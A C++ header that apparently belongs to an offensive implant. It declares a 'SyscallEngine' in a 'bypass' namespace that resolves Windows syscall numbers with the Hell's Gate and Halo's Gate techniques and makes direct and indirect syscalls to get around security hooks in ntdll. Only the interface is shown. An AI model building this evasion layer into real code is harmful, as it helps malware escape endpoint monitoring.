#ifndef UNHOOK_SYSCALLS_H
#define UNHOOK_SYSCALLS_H

/**
 * PSEUDO — syscalls.h
 * Layer 4b: Direct/indirect syscall engine.
 * Hell's Gate / Halo's Gate for dynamic SSN resolution.
 */

#include <cstdint>

namespace bypass {

class SyscallEngine {
public:
    // Resolve syscall number for a given ntdll function
    static uint16_t resolve_ssn(const char* function_name);

    // Execute direct syscall (from implant memory)
    static int64_t direct_syscall(uint16_t ssn,
                                  uint64_t p1 = 0, uint64_t p2 = 0,
                                  uint64_t p3 = 0, uint64_t p4 = 0);

    // Execute indirect syscall (syscall instruction inside ntdll)
    static int64_t indirect_syscall(uint16_t ssn,
                                    uint64_t p1 = 0, uint64_t p2 = 0,
                                    uint64_t p3 = 0, uint64_t p4 = 0);

    // Initialize: find clean ntdll, extract all SSNs
    static bool initialize();

    // Cleanup
    static void shutdown();
};

} // namespace bypass

#endif // UNHOOK_SYSCALLS_H
